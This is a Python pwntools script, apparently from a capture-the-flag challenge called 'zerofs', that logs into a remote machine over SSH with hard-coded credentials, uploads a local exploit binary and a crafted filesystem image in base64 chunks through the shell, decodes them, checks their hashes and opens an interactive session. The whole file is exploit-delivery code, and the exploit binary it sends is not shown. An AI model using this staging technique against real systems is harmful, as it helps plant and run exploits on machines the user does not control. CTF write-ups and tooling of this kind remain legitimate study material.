from base64 import b64encode
from pwn import *


def main():
    s = ssh(host='202.120.7.198', user='ctf', password='Happyzerofs!')
    sh = s.shell('/bin/sh')
    size = 0x200

    with open('fs/exp/e') as f:
        binary = f.read()
    binary = b64encode(binary)
    i = 0
    print len(binary)
    while i < len(binary):
        b = binary[i:i + size]
        cmd = 'echo -n "%s" >> /tmp/e.b64;' % b
        sh.recvuntil('/ $')
        sh.sendline(cmd)
        print i
        i += size
    sh.sendline('base64 -d /tmp/e.b64 > /tmp/e')

    with open('fs/tmp/zerofs.img') as f:
        binary = f.read()
    binary = b64encode(binary)
    i = 0
    print len(binary)
    while i < len(binary):
        b = binary[i:i + size]
        cmd = 'echo -n "%s" >> /tmp/zerofs.img.b64;' % b
        sh.recvuntil('/ $')
        sh.sendline(cmd)
        print i
        i += size
    sh.sendline('base64 -d /tmp/zerofs.img.b64 > /tmp/zerofs.img')

    sh.recvuntil('/ $')
    sh.sendline('md5sum /tmp/zerofs.img')
    sh.recvuntil('/ $')
    sh.sendline('md5sum /tmp/e')

    sh.recvuntil('/ $')
    sh.interactive()


if __name__ == '__main__':
    main()